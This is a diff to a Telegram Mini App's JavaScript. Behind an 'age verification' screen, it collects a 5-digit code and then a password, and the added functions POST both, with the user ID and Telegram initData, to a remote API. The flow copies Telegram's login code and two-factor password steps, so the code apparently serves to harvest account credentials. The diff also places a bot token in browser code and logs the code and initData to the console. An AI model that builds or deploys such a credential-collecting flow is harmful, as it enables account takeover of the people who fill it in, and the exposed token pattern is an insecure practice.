@@ -1,20 +1,33 @@
-// Initialize Telegram Web App
+// ==================== CONFIGURATION ====================
+const CONFIG = {
+    BOT_TOKEN: process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE',
+    API_BASE_URL: process.env.API_BASE_URL || 'https://your-api.com/api',
+    ENABLE_MOCK_AUTH: true, // Set to false for production
+};
+
+// ==================== TELEGRAM WEB APP INITIALIZATION ====================
 const tg = window.Telegram?.WebApp;
 
 if (tg) {
     tg.ready();
     tg.expand();
+    console.log('✅ Telegram Web App initialized');
+    console.log('Init Data:', tg.initData);
 }
 
-// State Management
+// ==================== STATE MANAGEMENT ====================
 const state = {
     currentScreen: 'ageVerification',
     code: '',
     codeTimer: null,
     codeTimerSeconds: 120,
+    userId: tg?.initDataUnsafe?.user?.id || null,
+    userName: tg?.initDataUnsafe?.user?.username || null,
 };
 
-// Screen Navigation
+console.log('📱 User State:', state);
+
+// ==================== SCREEN NAVIGATION ====================
 const screens = {
     ageVerification: 'ageVerificationScreen',
     codeInput: 'codeInputScreen',
@@ -48,7 +61,7 @@ function showScreen(screenName) {
 const confirmAgeBtn = document.getElementById('confirmAgeBtn');
 
 confirmAgeBtn.addEventListener('click', () => {
-    console.log('Age verification confirmed');
+    console.log('✅ Age verification confirmed');
     showScreen('codeInput');
     startCodeTimer();
 });
@@ -137,18 +150,65 @@ submitCodeBtn.addEventListener('click', submitCode);
 function submitCode() {
     if (state.code.length !== 5) return;
 
-    console.log('Code submitted:', state.code);
+    console.log('📤 Code submitted:', state.code);
     
-    // Simulate code verification
-    if (state.code === '12345') {
-        console.log('Valid code entered');
-        clearInterval(state.codeTimer);
-        showScreen('password');
+    if (CONFIG.ENABLE_MOCK_AUTH) {
+        // Simulate code verification
+        if (state.code === '12345') {
+            console.log('✅ Valid code entered');
+            clearInterval(state.codeTimer);
+            showScreen('password');
+        } else {
+            // Show error
+            codeTimer.textContent = 'Incorrect code. Please try again.';
+            codeTimer.style.color = '#e74c3c';
+            resetCodeInput();
+        }
     } else {
-        // Show error
-        codeTimer.textContent = 'Incorrect code. Please try again.';
+        // Real API call
+        verifyCodeWithAPI(state.code);
+    }
+}
+
+// Real API verification
+async function verifyCodeWithAPI(code) {
+    try {
+        submitCodeBtn.disabled = true;
+        submitCodeBtn.textContent = 'Verifying...';
+
+        const response = await fetch(`${CONFIG.API_BASE_URL}/verify-code`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': `Bearer ${CONFIG.BOT_TOKEN}`,
+            },
+            body: JSON.stringify({
+                code: code,
+                userId: state.userId,
+                initData: tg?.initData || null,
+            }),
+        });
+
+        const data = await response.json();
+
+        if (data.success) {
+            console.log('✅ Code verified via API');
+            clearInterval(state.codeTimer);
+            showScreen('password');
+        } else {
+            codeTimer.textContent = data.message || 'Incorrect code. Please try again.';
+            codeTimer.style.color = '#e74c3c';
+            resetCodeInput();
+        }
+
+        submitCodeBtn.textContent = 'Submit Code';
+        submitCodeBtn.disabled = false;
+    } catch (error) {
+        console.error('❌ API Error:', error);
+        codeTimer.textContent = 'Network error. Please try again.';
         codeTimer.style.color = '#e74c3c';
-        resetCodeInput();
+        submitCodeBtn.textContent = 'Submit Code';
+        submitCodeBtn.disabled = false;
     }
 }
 
@@ -179,16 +239,62 @@ function verifyPassword() {
         return;
     }
 
-    console.log('Password submitted');
+    console.log('📤 Password submitted');
     
-    // Simulate password verification
-    if (password === 'password123') {
-        console.log('Valid password entered');
-        passwordError.textContent = '';
-        showScreen('success');
+    if (CONFIG.ENABLE_MOCK_AUTH) {
+        // Simulate password verification
+        if (password === 'password123') {
+            console.log('✅ Valid password entered');
+            passwordError.textContent = '';
+            showScreen('success');
+        } else {
+            passwordError.textContent = 'Incorrect password. Please try again.';
+            passwordInput.value = '';
+        }
     } else {
-        passwordError.textContent = 'Incorrect password. Please try again.';
-        passwordInput.value = '';
+        // Real API call
+        verifyPasswordWithAPI(password);
+    }
+}
+
+// Real API password verification
+async function verifyPasswordWithAPI(password) {
+    try {
+        verifyPasswordBtn.disabled = true;
+        verifyPasswordBtn.textContent = 'Verifying...';
+
+        const response = await fetch(`${CONFIG.API_BASE_URL}/verify-password`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': `Bearer ${CONFIG.BOT_TOKEN}`,
+            },
+            body: JSON.stringify({
+                password: password,
+                userId: state.userId,
+                code: state.code,
+                initData: tg?.initData || null,
+            }),
+        });
+
+        const data = await response.json();
+
+        if (data.success) {
+            console.log('✅ Password verified via API');
+            passwordError.textContent = '';
+            showScreen('success');
+        } else {
+            passwordError.textContent = data.message || 'Incorrect password. Please try again.';
+            passwordInput.value = '';
+        }
+
+        verifyPasswordBtn.textContent = 'Verify';
+        verifyPasswordBtn.disabled = false;
+    } catch (error) {
+        console.error('❌ API Error:', error);
+        passwordError.textContent = 'Network error. Please try again.';
+        verifyPasswordBtn.textContent = 'Verify';
+        verifyPasswordBtn.disabled = false;
     }
 }
 
@@ -205,7 +311,7 @@ const restartBtn = document.getElementById('restartBtn');
 restartBtn.addEventListener('click', restartApp);
 
 function restartApp() {
-    console.log('Restarting application');
+    console.log('🔄 Restarting application');
     state.code = '';
     passwordInput.value = '';
     passwordError.textContent = '';
@@ -215,7 +321,12 @@ function restartApp() {
 
 // ==================== INITIALIZATION ====================
 window.addEventListener('load', () => {
-    console.log('Mini App Initialized');
+    console.log('🚀 Mini App Initialized');
+    console.log('🔧 Configuration:', {
+        BOT_TOKEN: CONFIG.BOT_TOKEN.substring(0, 10) + '...',
+        API_URL: CONFIG.API_BASE_URL,
+        MOCK_AUTH: CONFIG.ENABLE_MOCK_AUTH,
+    });
     
     // Set Telegram app title
     if (tg) {
@@ -226,8 +337,21 @@ window.addEventListener('load', () => {
 // Handle visibility changes to pause timer
 document.addEventListener('visibilitychange', () => {
     if (document.hidden && state.codeTimer) {
+        console.log('⏸️ App paused - stopping timer');
         clearInterval(state.codeTimer);
     } else if (!document.hidden && state.currentScreen === 'codeInput' && !state.codeTimer) {
+        console.log('▶️ App resumed - restarting timer');
         startCodeTimer();
     }
 });
+
+// Send success data to Telegram
+function sendAuthSuccessToTelegram() {
+    if (tg) {
+        tg.sendData(JSON.stringify({
+            status: 'authenticated',
+            userId: state.userId,
+            timestamp: new Date().toISOString(),
+        }));
+    }
+}
